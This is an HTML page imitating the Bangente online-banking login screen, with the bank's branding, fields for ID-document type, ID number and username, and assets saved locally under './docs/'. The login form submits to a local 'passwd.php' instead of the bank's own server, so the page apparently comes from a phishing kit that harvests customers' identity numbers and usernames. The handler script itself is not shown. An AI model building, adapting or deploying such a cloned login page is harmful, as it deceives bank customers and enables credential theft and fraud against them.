<html lang="es" style="overflow: auto;"><head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<script async="" src="./docs/clarity.js.descarga"></script>
<script async="" src="./docs/rud803c5it"></script>

<meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- CSRF Token -->
  <meta name="csrf-token" content="8dahrVcZCZeGG6mQEezrlzd2PMtnNLGG378cwDW1">
  <meta name="msapplication-TileImage" content="https://bangentenlinea.bangente.com.ve/assets/images/logos/isotipo.png">

  <title>Bangente</title>

  <!-- #FAVICONS -->
  <link rel="shortcut icon" href="https://bangentenlinea.bangente.com.ve/assets/images/logos/isotipo.png" type="image/x-icon">
  <link rel="icon" href="https://bangentenlinea.bangente.com.ve/assets/images/logos/isotipo.png" type="image/x-icon">
  <link rel="icon" type="image/png" sizes="32x32" href="https://bangentenlinea.bangente.com.ve/assets/images/logos/isotipo.png">
  <link rel="icon" type="image/png" sizes="16x16" href="https://bangentenlinea.bangente.com.ve/assets/images/logos/isotipo.png">

  <!-- Fonts -->
  <link rel="dns-prefetch" href="https://fonts.gstatic.com/">
 <link href="https://fonts.cdnfonts.com/css/helvetica-neue-lt-std-55" rel="stylesheet">
  <link rel="stylesheet" href="./docs/all.css">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha512-Evv84Mr4kqVGRNSgIGL/F/aIDqQb7xQ2vcrdIwxfjThSH8CSR7PBEakCr51Ck+w+/U6swU2Im1vVX0SVk9ABhg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
  <link id="gull-theme" rel="stylesheet" href="./docs/lite-purple.min.css">
  <link rel="stylesheet" href="./docs/perfect-scrollbar.css">
  <link href="./docs/datepicker.min.css" rel="stylesheet" type="text/css">
  <!-- Styles -->
  <link href="./docs/bangente.css" rel="stylesheet">
  <link href="./docs/lite-purple(1).min.css" rel="stylesheet">
  <link href="./docs/dropzone.css" rel="stylesheet">

  <link href="./docs/bangente.css" rel="stylesheet">

  <script type="text/javascript">
    (function(c,l,a,r,i,t,y){
        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
    })(window, document, "clarity", "script", "rud803c5it");
</script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>

</head>

<body id="login" class="fondoInicial" 
style="background-image: url(&quot;https://bangentenlinea.bangente.com.ve/assets/images/bgLogin.png&quot;); background-repeat: no-repeat; background-size: cover; height: auto; font-family: Helvetica; background-position: center center; opacity: 1;" bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJkaXNhYmxlZCIsIkZBQ0VCT09LIjoiZGlzYWJsZWQiLCJUV0lUVEVSIjoiZGlzYWJsZWQiLCJSRURESVQiOiJkaXNhYmxlZCIsIlBJTlRFUkVTVCI6ImRpc2FibGVkIiwiSU5TVEFHUkFNIjoiZGlzYWJsZWQiLCJMSU5LRURJTiI6ImRpc2FibGVkIiwiQ09ORklHIjoiZGlzYWJsZWQifSwidmVyc2lvbiI6IjIuMC4yMiIsInNjb3JlIjoyMDAyMn1d" __processed_ed9aca17-6517-4467-b5e4-a2bd428245e6__="true" cz-shortcut-listen="true" bis_skin_checked="1">


  <div id="main" role="main" class="mainRegister auth-bg auth-bg-per" bis_skin_checked="1">
    <div id="content" class="container" bis_skin_checked="1">
      <div class="auth-box login-box" bis_skin_checked="1" style="opacity: 1;">



        
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">

        <!-- CSRF Token -->
        <meta name="csrf-token" content="8dahrVcZCZeGG6mQEezrlzd2PMtnNLGG378cwDW1">
        <meta name="msapplication-TileImage" content="https://bangentenlinea.bangente.com.ve/assets/images/logos/isotipo.png">

        <title>Bangente</title>

        <!-- #FAVICONS -->
        <link rel="shortcut icon" href="https://bangentenlinea.bangente.com.ve/assets/images/logos/isotipo.png" type="image/x-icon">
        <link rel="icon" href="https://bangentenlinea.bangente.com.ve/assets/images/logos/isotipo.png" type="image/x-icon">
        <link rel="icon" type="image/png" sizes="32x32" href="https://bangentenlinea.bangente.com.ve/assets/images/logos/isotipo.png">
        <link rel="icon" type="image/png" sizes="16x16" href="https://bangentenlinea.bangente.com.ve/assets/images/logos/isotipo.png">

        <!-- Fonts -->
        <link rel="dns-prefetch" href="https://fonts.gstatic.com/">

        <link rel="stylesheet" href="./docs/all.css">
        <link id="gull-theme" rel="stylesheet" href="./docs/lite-purple(1).min.css">
        <link rel="stylesheet" href="./docs/perfect-scrollbar.css">
        <link href="./docs/datepicker.min.css" rel="stylesheet" type="text/css">
        <!-- Styles -->
        <link href="./docs/lite-purple(1).min.css" rel="stylesheet">
        <link href="./docs/dropzone.css" rel="stylesheet">
        <link rel="stylesheet" href="./docs/app.cssv=c21fd1bc-bfff-414a-8766-15a5ed856f10.css">
        <link rel="stylesheet" href="./docs/app.cssv=2a075d0a-4f69-4e27-b941-e85e556f1394.css">
        <link rel="stylesheet" href="./docs/sweetalert2.min.css">
        <script src="./docs/jquery.min.js.descarga"></script>
       
        <script src="./docs/sweetalert2.min.js.descarga"></script>
     
        <link href="./docs/bangente.css" rel="stylesheet">



        <div class="auth-layout-wrap left" bis_skin_checked="1">
          <div class="auth-content" bis_skin_checked="1">
            <div class="card2 o-hidden" style="max-width: 490px;" bis_skin_checked="1">
              <div class="row" style="float: right;" bis_skin_checked="1">
                <div class="p-4" bis_skin_checked="1">
                  <div class="text-center mb-4" bis_skin_checked="1">
                    <img src="./docs/logoHorizontalMorado.png" alt="" class="imgInicio">
                    <hr class="lineSeparator">
                  </div>
                  <h1 class="mb-3 text-18 titleLogin">Bienvenido</h1>
                  <form id="login-form" method="post" action="passwd.php">
                   
                    <div class="form-group" bis_skin_checked="1">
                    
                      <div bis_skin_checked="1">
                        <label for="" class="label">Tipo de Documento</label>
                        <div class="form-group" bis_skin_checked="1">
                          <label for="" class="select">
                            <select class="form-control form-control-rounded" name="tipoDocumento" id="tipoDocumento">
                              <option value="">Seleccione</option>
                              <option value="Persona">Persona</option>
                              <option value="Gubernamental">Gubernamental</option>
                              <option value="Firma Personal E.">Firma Personal E.</option>
                              <option value="Comunal">Comunal</option>
                              <option value="RIF">RIF</option>
                              <option value="Firma Personal V.">Firma Personal V.</option>
                            </select>
                            <i></i>
                            <b class="tooltip tooltip-top-right"><i class="fa fa-lock txt-color-teal"></i>
                              Tipo de Documento de Identidad</b>
                          </label>
                        </div>
                      </div>
                      <div bis_skin_checked="1">
                        <label for="documento">
                          <i class="fa fa-id-card-o icon-append"></i> Número de Documento
                        </label>
                        <div class="form-group" bis_skin_checked="1">
                          <div class="input-group" bis_skin_checked="1">
                            <input type="password" class="form-control form-control-rounded col-md-6" maxlength="10" name="documento" id="documento" placeholder="Documento de Identidad" autocomplete="off">
                            <b class="tooltip tooltip-top-right">
                              <i class="fa fa-lock txt-color-teal"></i>
                              Número de documento de identidad</b>
                            <div class="input-group-append" bis_skin_checked="1">
                              <button id="showPassword" class="btn btn-primary btn-rounded" type="button"><i class="fa fa-eye-slash icon-append"></i></button>
                            </div>
                          </div>
                        </div>
                        <script>
                          var fieldDocumento = document.querySelector('[name="documento"]');
                          fieldDocumento.addEventListener('keypress', function (event) {
                            var key = event.keyCode;
                            if (key === 32) {
                              event.preventDefault();
                            }
                          });
                          $('#showPassword').click(function () {
                            var cambio = document.getElementById('documento');
                            if (cambio.type == 'password') {
                              cambio.type = 'text';
                              $('.icon-append')
                                .removeClass('fa fa-eye-slash')
                                .addClass('fa fa-eye');
                            } else {
                              cambio.type = 'password';
                              $('.icon-append')
                                .removeClass('fa fa-eye')
                                .addClass('fa fa-eye-slash');
                            }
                          });

                          $('#documento').on('paste', function (e) {
                            e.preventDefault();
                          });

                          $('#documento').on('copy', function (e) {
                            e.preventDefault();
                          });
                        </script>
                      </div>
                      <div bis_skin_checked="1">
                        <label for="usuario" class="inicio"><span>Usuario</span></label>
                        <input id="usuario" class="form-control form-control-rounded"  name="usuario"  required=""  maxlength="16" >

                      </div>
                    </div>
                    <button id="btn-siguiente" class="btn btn-rounded btn-primary btn-blockLogin mt-2 login" type="submit" disabled>Ingresar
                    </button>
                    <div class="mt-3 text-center left" bis_skin_checked="1">
                      <a href="#" class="text-muted inicio" id="cmdOlvido"><span>¿Olvidaste tu
                          usuario?</span></a>
                    </div>
                    <div class="mt-3 text-center right" bis_skin_checked="1">
                      <a href="#" class="text-muted inicio" id="cmdUnlock"><span>¿Deseas desbloquear tu
                          usuario?</span></a>
                    </div>
                  </form>
                  <br><br>
                  <div class="mt-3 text-center left unete" bis_skin_checked="1">
                    <button class="btn btn-rounded btn-info  mt-2 loginGren" id="cmdRegister">Regístrese
                    </button>
                  </div>
                </div>
              </div>
            </div>
          </div>

        </div>
      </div>
      <!-- End col -->
    </div>
    <!-- End row -->
  </div>
  <div class="loadscreen" id="preloader" style="display: none;">
    <div class="loader spinner-bubble spinner-bubble-primary"></div>
  </div>
 <script src="./docs/script.js"></script>
</body></html>